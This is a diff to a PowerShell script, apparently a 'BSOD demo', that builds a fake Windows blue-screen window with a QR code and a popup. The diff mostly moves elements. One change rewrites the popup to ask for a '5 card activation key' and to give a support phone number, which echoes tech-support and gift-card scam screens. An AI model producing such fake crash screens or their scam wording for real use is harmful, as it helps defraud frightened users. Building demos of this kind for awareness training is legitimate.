@@ -60,7 +60,7 @@ PS> Show-BSODDemo
 	$mainMessage.Width = 900
 	$mainMessage.Height = 150
 	$mainMessage.Font = New-Object System.Drawing.Font('Segoe UI Light', 22, [System.Drawing.FontStyle]::Regular)
-	$mainMessage.Location = New-Object System.Drawing.Point(220, 270)
+	$mainMessage.Location = New-Object System.Drawing.Point(220, 310)
 	$mainMessage.Text = $mainText
 	$mainMessage.ForeColor = [System.Drawing.Color]::White
 	$mainMessage.BackColor = $form.BackColor
@@ -73,7 +73,7 @@ PS> Show-BSODDemo
 
 	$qrBox = New-Object System.Windows.Forms.PictureBox
 	$qrBox.Size = New-Object System.Drawing.Size(110, 110)
-	$qrBox.Location = New-Object System.Drawing.Point(220, 440)
+	$qrBox.Location = New-Object System.Drawing.Point(220, 480)
 	$qrBox.BackColor = [System.Drawing.Color]::White
 	$qrBox.BorderStyle = [System.Windows.Forms.BorderStyle]::None
 	$qrBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
@@ -96,7 +96,7 @@ PS> Show-BSODDemo
 	$qrText.AutoSize = $false
 	$qrText.Width = 500
 	$qrText.Height = 150
-	$qrText.Location = New-Object System.Drawing.Point(345, 445)
+	$qrText.Location = New-Object System.Drawing.Point(345, 485)
 	$form.Controls.Add($qrText)
 
 	# Vertical progress bar hidden - not in reference
@@ -190,10 +190,9 @@ PS> Show-BSODDemo
 	$popup.Controls.Add($popupTitle)
 
 	$popupText = New-Object System.Windows.Forms.Label
-	$popupText.Text = "Enter 10-digit activation key to exit system recovery mode:`r`nCall support at +1-888-888-8888"
+	$popupText.Text = "Enter the 5 card activation key`r`nCall support at +1-888-888-8888"
 	$popupText.Font = New-Object System.Drawing.Font('Segoe UI', 12)
 	$popupText.ForeColor = [System.Drawing.Color]::FromArgb(36, 36, 36)
-	$popupText.BackColor = [System.Drawing.Color]::Transparent
 	$popupText.AutoSize = $false
 	$popupText.Width = 410
 	$popupText.Height = 70
